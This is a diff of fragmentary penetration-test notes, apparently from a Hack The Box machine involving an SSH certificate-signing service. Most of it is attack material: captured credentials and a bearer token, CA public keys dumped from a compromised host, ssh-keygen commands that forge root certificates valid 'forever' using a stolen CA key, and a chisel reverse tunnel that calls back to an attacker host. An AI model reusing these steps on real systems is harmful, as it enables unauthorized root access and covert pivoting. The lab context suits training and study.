@@ -87,7 +87,7 @@ eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
         ssh localhost 
 - [+] :	
   >>	
-  
+  10.129.214.30
 msainristil&pass=
 su msainristil
 82yards2closeit
@@ -120,5 +120,27 @@ url -s signserv.ssg.htb/v1/sign -d '{
   "username": "zzinter"
 }' -H "Content-Type: application/json" -H "Authorization:Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE"
 
+ssh-keygen -s /path/to/signing_key -I key_id -n user1,user2 -V +52w /path/to/public_key.pub
 
+ugEG5rR5SG8uPd
+
+[signserv.ssg.htb]:2222 ([172.223.0.1]:2222)
+
+^^^^
+/usr/lib/ssl/cert.pem 
+
+
+root@itrc:/etc/ssh# cat ca_users_keys.pub
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDoBD1UoFfL41g/FVX373rdm5WPz+SZ0bWt5PYP+dhok4vb3UpJPIGOeAsXmAkzEVYBHIiE+aGbrcXvDaSbZc6cI2aZfFraEPt080KVKHALAPgaOn/zFdld8P9yaENKBKltWLZ9I6rwg98IGEToB7JNZF9hzasjjD0IDKv8JQ3NwimDcZTc6Le0hJw52ANcLszteliFSyoTty9N/oUgTUjkFsgsroEh+Onz4buVD2bxoZ+9mODcdYTQ4ChwanfzFSnTrTtAQrJtyH/bDRTa2BpmdmYdQu+4HcbDl5NbiEwu1FNskz/YNDPkq3bEYEOvgMiu/0ZMy0wercx6Tn0G2cppS70/rG5GMcJi0WTcUic3k+XJ191WEG1EtXJNbZdtJc7Ky0EKhat0dgck8zpq62kejtkBQd86p6FvR8+xH3/JMxHvMNVYVODJt/MIik99sWb5Q7NCVcIXQ0ejVTzTI9QT27km/FUgl3cs5CZ4GIN7polPenQXEmdmbBOWD2hrlLs= ITRC Certifcate CA
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIHg8Cudy1ShyYfqzC3ANlgAcW7Q4MoZuezAE8mNFSmx Global SSG SSH Certficiate from IT
+
+ssh-keygen -s ca-itrc -I 12345 -n root -V +52w ca-itrc.pub
+
+ssh-keygen -s ssh_host_ecdsa_key -z 200 -I root -V -10w:forever -n root_user root.pub
+main.exe client http://10.10.14.217:3636 R:48452:172.223.0.3:48452
+		chisel on attacker
+		./chisel server --reverse  --port 3636
+		
+		
+		ssh-keygen -s 1.key -z 200 -I root -V -10w:forever -n root_user root.pub
 
